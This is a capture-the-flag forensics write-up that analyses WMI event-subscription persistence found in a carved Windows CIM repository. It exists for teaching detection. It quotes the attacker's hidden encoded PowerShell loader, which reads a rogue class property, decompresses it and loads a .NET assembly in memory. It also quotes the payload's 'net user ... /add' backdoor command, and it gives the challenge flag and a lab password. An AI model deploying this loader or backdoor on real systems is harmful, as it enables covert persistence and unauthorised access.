# Day 12 — After Hours

> Part of the [Hacker Holidays 2026 findings log](../FINDINGS.md).

- **Status:** ✅ Completed (2026-08-07)
- **Target:** WMI CIM repository artifacts pulled from the resort's back-office machine — `OBJECTS.DATA`, `INDEX.BTR`, `MAPPING1/2/3.MAP` (the on-disk Windows Management Instrumentation database).
- **Category:** Forensics — WMI Event Subscription persistence ("fileless" / living-off-the-land) → embedded .NET payload extraction → Base64 decode.
- **Objective:** Parse the WMI repository for hidden custom configuration data, locate the malicious class, extract and decode its embedded payload, and recover the flag.
- **The trick:** The persistence hides in the WMI repository — the "quiet corner most tools don't check." Standard Autoruns / Run-key / Scheduled-Task tooling historically misses **WMI Event Subscription persistence** (`__EventFilter` + `EventConsumer` + `__FilterToConsumerBinding`), exactly as @0xMia's PSA hinted ("autoruns/persistence tools straight up don't catch this one… dig through the raw data by hand"). The actual payload is stashed as a **custom property on a rogue WMI class masquerading as a legit one**.
- **Attack path (summary):**
  1. **Identify the artifacts:** `OBJECTS.DATA` (object store) + `INDEX.BTR` (B-tree index) + `MAPPING*.MAP` (page maps) = a WMI CIM repository, normally at `C:\Windows\System32\wbem\Repository\`.
  2. **Find the persistence:** carving strings from `OBJECTS.DATA` shows the classic trio (`__EventFilter`, `CommandLineEventConsumer`, `__FilterToConsumerBinding`) plus a `CommandLineTemplate` running `cmd /C powershell.exe -Sta -Nop -Window Hidden -enc <base64>`.
  3. **Decode the `-enc` launcher (UTF-16LE Base64):** it doesn't carry the payload itself — it **reads a custom WMI class property** and executes it in memory:
     ```powershell
     $file = ([WmiClass]'ROOT\cimv2:Win32_HardwareTelemetry').Properties['ConfigData'].Value
     $o = New-Object IO.MemoryStream
     $d = New-Object IO.Compression.DeflateStream(
            [IO.MemoryStream][Convert]::FromBase64String($file),
            [IO.Compression.CompressionMode]::Decompress)
     # ...copy/decompress into $o...
     [Reflection.Assembly]::Load($o.ToArray()).EntryPoint.Invoke($null,@(,[string[]]@())) | Out-Null
     ```
  4. **Locate the hidden config data:** the rogue class **`Win32_HardwareTelemetry`** (fake — impersonates a real-sounding telemetry class) carries a custom **`ConfigData`** property holding a ~2.2 KB Base64 blob (`7VZPbFRF…Z/Q06F8=`).
  5. **Extract the payload:** `ConfigData` = **Base64 → raw DEFLATE → a 4096-byte .NET assembly** (`MZ` header). It is `updates.exe`, namespace **`AfterHours`**, class `Program`.
  6. **Read the payload logic:** the assembly's .NET **UTF-16 user strings** reveal a machine-name gate and the backdoor command:
     - Gate: `Environment.MachineName == "bytelotusdc"`, else prints `Execution halted: Environment mismatch.`
     - On match it runs: `cmd.exe /c net user patch VEhNe1A0dGNoX29wM25lZF90aDNfQmFjS2QwMHJ9 /add`
  7. **Decode the flag:** the new user `patch`'s "password" is Base64 → `VEhNe1A0dGNoX29wM25lZF90aDNfQmFjS2QwMHJ9` decodes to the flag.
- **Flag:** <details><summary>click to reveal</summary><code>THM{P4tch_op3ned_th3_BacKd00r}</code></details>
- **Lessons:**
  - **WMI is a first-class persistence surface — hunt it explicitly.** `__EventFilter` + an `EventConsumer` (`CommandLine`/`ActiveScript`) + `__FilterToConsumerBinding` survive reboots and are invisible to Run-key/Startup/Task tooling. Baseline the repository (`Get-WmiObject -Namespace root\subscription -Class __*`, Sysmon Event IDs 19/20/21, or offline parsing of `OBJECTS.DATA`).
  - **Rogue classes masquerade as legitimate ones.** `Win32_HardwareTelemetry` sounds real but isn't a stock WMI class; a custom writable property (`ConfigData`) made the repository a covert storage blob. Enumerate non-standard classes and unexpected string properties, don't trust names.
  - **The launcher is rarely the payload.** The `-enc` command only *bootstrapped* — it read data from WMI, decompressed it, and `Assembly.Load`'d it entirely in memory (no file on disk). Follow the data flow (`Properties[...]`, `FromBase64String`, `DeflateStream`, `Assembly::Load`) instead of stopping at the first Base64 decode.
  - **Watch the encoding when carving strings.** The flag never showed up in an ASCII strings pass because it lives in the assembly's **UTF-16LE** user-string heap; use `strings -e l` / a Unicode pass (or a decompiler) on .NET binaries.
  - **Environment-keyed execution is an anti-analysis tactic.** The `MachineName == "bytelotusdc"` guard means the payload no-ops in a sandbox/analyst box; static extraction (read the IL/strings) beats detonation here.

## Walkthrough

The whole chain is self-contained in `OBJECTS.DATA`; no live WMI needed. On Kali:

```bash
# 0) Artifacts (from the AttackBox luggage room)
#    /root/Rooms/hacker-holidays-2026/after-hours  (lockbox pass: Aft3rH0ursAtt4chm3ntP4ss)
#    -> OBJECTS.DATA, INDEX.BTR, MAPPING1/2/3.MAP  == a WMI CIM repository

# 1) Carve the persistence + the -enc launcher out of the object store
strings -n 8 OBJECTS.DATA | grep -Ei 'EventFilter|EventConsumer|FilterToConsumer|CommandLineTemplate|powershell.*-enc'

# 2) Decode the UTF-16LE PowerShell launcher (reveals the ConfigData read + Assembly::Load)
python3 -c 'import base64,sys; print(base64.b64decode(sys.argv[1]).decode("utf-16-le"))' JABmAGkAbABl...==

# 3) Pull the rogue class ConfigData blob (Base64) — the big 7VZPbFRF... string
strings -n 8 OBJECTS.DATA | grep -Eo '7VZPbFRF[A-Za-z0-9+/=]+' | head -1 > configdata.b64

# 4) ConfigData = Base64 -> raw DEFLATE -> .NET assembly (updates.exe)
python3 - <<'PY'
import base64, zlib
blob = open('configdata.b64').read().strip()
data = zlib.decompress(base64.b64decode(blob), -15)   # -15 = raw deflate, no header
open('payload.exe','wb').write(data)
print(len(data), data[:2])                             # 4096 b'MZ'
PY

# 5) Read the payload's UTF-16 strings (or decompile with monodis / ilspycmd)
strings -e l payload.exe
#   ... bytelotusdc
#   ... /c net user patch VEhNe1A0dGNoX29wM25lZF90aDNfQmFjS2QwMHJ9 /add

# 6) Decode the backdoor "password" == the flag
echo 'VEhNe1A0dGNoX29wM25lZF90aDNfQmFjS2QwMHJ9' | base64 -d
#   THM{P4tch_op3ned_th3_BacKd00r}
```

## Key facts

| Item | Value |
| ---- | ----- |
| Artifacts | WMI CIM repository: `OBJECTS.DATA`, `INDEX.BTR`, `MAPPING1/2/3.MAP` |
| Lockbox pass | `Aft3rH0ursAtt4chm3ntP4ss` (AttackBox luggage room) |
| Persistence | `__EventFilter` + `CommandLineEventConsumer` + `__FilterToConsumerBinding` |
| Launcher | `cmd /C powershell.exe -Sta -Nop -Window Hidden -enc <UTF-16 base64>` |
| Launcher logic | reads `ROOT\cimv2:Win32_HardwareTelemetry` → `ConfigData`, DEFLATE-decompress, `[Reflection.Assembly]::Load(...).EntryPoint.Invoke()` |
| Hidden config data | rogue class `Win32_HardwareTelemetry`, custom `ConfigData` property (Base64 blob `7VZPbFRF…Z/Q06F8=`) |
| Payload | `ConfigData` = Base64 → raw DEFLATE → 4096-byte .NET assembly `updates.exe` (namespace `AfterHours`) |
| Payload gate | `Environment.MachineName == "bytelotusdc"` else `Execution halted: Environment mismatch.` |
| Backdoor action | `cmd.exe /c net user patch VEhNe1A0dGNoX29wM25lZF90aDNfQmFjS2QwMHJ9 /add` |
| Flag encoding | Base64: `VEhNe1A0dGNoX29wM25lZF90aDNfQmFjS2QwMHJ9` |
| Flag | `THM{P4tch_op3ned_th3_BacKd00r}` |
